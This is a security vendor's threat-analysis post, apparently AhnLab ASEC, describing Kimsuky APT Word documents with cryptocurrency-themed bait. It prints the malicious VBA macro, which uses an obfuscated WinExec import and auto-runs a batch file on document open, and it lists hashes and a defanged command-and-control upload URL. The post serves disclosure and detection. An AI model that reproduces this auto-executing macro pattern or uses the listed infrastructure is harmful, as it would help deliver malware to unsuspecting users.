@@ -1,0 +1,46 @@
+<div>
+Posted on <a href="https://asec.ahnlab.com/en/32958/" rel="bookmark" title="9:23 am">March 25, 2022</a>
+<h1 class="title">APT Attack Using Word Files About Cryptocurrency (Kimsuky)</h1>
+<p>On March 21st, the ASEC analysis team has discovered the Kimsuky group’s APT attacks that use Word files containing information about cryptocurrency. A total of three Word files were discovered that were used as baits for the attacks. The macro’s author and its execution flow are identical to that which was introduced in the <a href="https://asec.ahnlab.com/en/32609/">ASEC blog post uploaded on March 17th</a> (Title: Malicious Word Files Disguised as Product Introduction). It appears that all three files are properly created Word files containing malicious macro codes, and seeing how the text is related to cryptocurrency, the attacker must have been targeting cryptocurrency companies. All the Word files were modified by an author named Acer, and seeing how they were modified on the morning of March 21st, the files may be used when the attacker launches their attack. This warrants extreme caution.</p>
+<ul><li>Regarding Quantity of Stakeholder.doc (Modified by: Acer, Date Modified: 2022-03-21 10:29 AM)</li><li>Assets and Liabilities Status.doc (Modified by: Acer, Date Modified: 2022-03-21 11:10 AM)</li><li>The 3rd Stakeholder Meeting.doc (Modified by: Acer, Date Modified: 2022-03-21 11:03 AM)</li></ul>
+<figure class="aligncenter"><img alt="" class="wp-image-32899 jetpack-lazy-image jetpack-lazy-image--handled" height="1125" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/image-74.png?resize=938%2C1024&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1030"/><img alt="" class="wp-image-32899" height="1125" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/image-74.png?resize=938%2C1024&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1030"/><figcaption>Figure 1. Regarding Quantity of Stakeholder.doc</figcaption></figure>
+<figure class="aligncenter"><img alt="" class="wp-image-32901 jetpack-lazy-image" height="1125" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/image-75.png?resize=938%2C1024&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1030"/><img alt="" class="wp-image-32901" height="1125" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/image-75.png?resize=938%2C1024&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1030"/><figcaption>Figure 2. Assets and Liabilities Status.doc</figcaption></figure>
+<figure class="aligncenter"><img alt="" class="wp-image-32902 jetpack-lazy-image" height="1125" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/image-76.png?resize=938%2C1024&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1030"/><img alt="" class="wp-image-32902" height="1125" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/image-76.png?resize=938%2C1024&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1030"/><figcaption>Figure 3. The 3rd Stakeholder Meeting.doc</figcaption></figure>
+<figure class="aligncenter"><img alt="" class="wp-image-32911 jetpack-lazy-image" height="397" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/image-77.png?resize=1024%2C277&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1465"/><img alt="" class="wp-image-32911" height="397" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/image-77.png?resize=1024%2C277&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1465"/><figcaption>Figure 4. Comparison of final modified date and time for Word files (Titles of files, from left: Assets and Liabilities Status.doc, The 3rd Stakeholder Meeting.doc, Regarding Quantity of Stakeholder.doc)</figcaption></figure>
+<p>All three Word files used the same macro, and its feature matches those of the macro code in <a href="https://asec.ahnlab.com/en/32609/">temp.doc</a> that was introduced in the following blog post.</p>
+<ul><li>Feature: run “C:\Users\Public\Documents\no1.bat”</li></ul>
+<code class="language-js">Private Declare PtrSafe Function NqBHp7qCwNnGUYNUeNUrpXNqBHp7qCwNnGUYNUeNUrpXVpyNeGEx8cxyXNqBHp7qCwNnGUYNUeNUrpXVpyNwqBwFxjyXqyXNqBHp7qCwNnGUYNUeNUrpXVpyNpDYkWbfyp4YLUJGqXtYK3VpyNeGEx8cxyXNqBHp7qCwNnGUYNUeNUrp Lib "kernel32" Alias "WinExec" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long
+Sub Document_Open()
+ NqBHp7qCwNnGUYNUeNUrpXNqBHp7qCwNnGUYNUeNUrpXVpyNeGEx8cxyXNqBHp7qCwNnGUYNUeNUrpXVpyNwqBwFxjyXqyXNqBHp7qCwNnGUYNUeNUrpXVpyNpDYkWbfyp4YLUJGqXtYK3VpyNeGEx8cxyXNqBHp7qCwNnGUYNUeNUrp "C:\Users\Public\Documents\no1.bat", 0
+End Sub</code>
+<p>The one that runs “no1.bat” file seems to have been by a different Word file, not the collected file. As introduced in one of the past <a href="https://asec.ahnlab.com/en/32609/">blog</a> posts, it appears that this was created by the macro that prompts users to click Enable Macro button (see Figure 5).</p>
+<figure class="aligncenter"><img alt="" class="wp-image-32869 jetpack-lazy-image" height="745" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/image-68.png?resize=1024%2C745&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1024"/><img alt="" class="wp-image-32869" height="745" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/image-68.png?resize=1024%2C745&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1024"/><figcaption>Figure 5. First discovered malicious file that prompts user to click Enable Macro</figcaption></figure>
+<p>Ultimately, it has been confirmed that the same distribution method and execution flow are adopted by both the malicious Word files disguised as the product introduction files and the Word files of this case. This means that the attacker is attacking virtual asset providers as well as distribution and shopping industries.</p>
+<p>Files may ask users to press the button ‘Enable Content’, but users should refrain from pressing the button of the files from unknown sources (see Figure 5).</p>
+<p>AhnLab’s anti-malware product, V3, is monitoring such attacks and detects them using the alias below.</p>
+<p>[IOC]
+[MD5]
+– cloudy.bat : 0ecc9a4cea5c289732c76234c47a60e9
+– download.vbs : 82ed73e4adbe5c26bafb5072657fd46b
+– no4.bat : 7a2f350a2a6aa1d065c2b19be6dc6fb4
+– start.vbs : 8a2eeafca1b33010d7ed812cf17d42f5
+– upload.vbs : 869f98aac4963c7db7276d2a914d081e
+– Assets and Liabilities Status.doc: a872dbb06e2dc721f180d05e2c1c8c20
+– The 3rd Stakeholder Meeting.doc: 56a936b9b3a3bdafed40cf5d056febaf
+– Regarding Quantity of Stakeholder.doc: dc0223fb97891a90049d0c0d2beeb756</p>
+<p>[Detection Name (Engine ver.)]
+– cloudy.bat : Trojan/VBS.Akdoor (2022.03.23.00)
+– download.vbs : Downloader/VBS.Generic (2022.03.23.00)
+– no4.bat : Trojan/BAT.Agent (2022.03.23.00)
+– start.vbs : Trojan/VBS.Akdoor (2022.03.23.00)
+– upload.vbs : Trojan/VBS.Akdoor (2022.03.23.00)
+– Assets and Liabilities Status.doc: Trojan/DOC.Agent (2022.03.23.00)
+– The 3rd Stakeholder Meeting.doc: Trojan/DOC.Agent (2022.03.23.00)
+– Regarding Quantity of Stakeholder.doc: Trojan/DOC.Agent (2022.03.23.00)</p>
+<p>[C&amp;C]
+– hxxp://sysrtri-man.com/upl11/upload.php</p>
+<p>Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to check related IOC and detailed analysis information.</p>
+<p>
+Categories:<a href="https://asec.ahnlab.com/en/category/malware-information/" rel="category tag">Malware Information</a> </p>
+<p>Tagged as:<a href="https://asec.ahnlab.com/en/tag/apt-en/" rel="tag">APT</a>, <a href="https://asec.ahnlab.com/en/tag/kimsuky-en/" rel="tag">Kimsuky</a></p>
+</div>
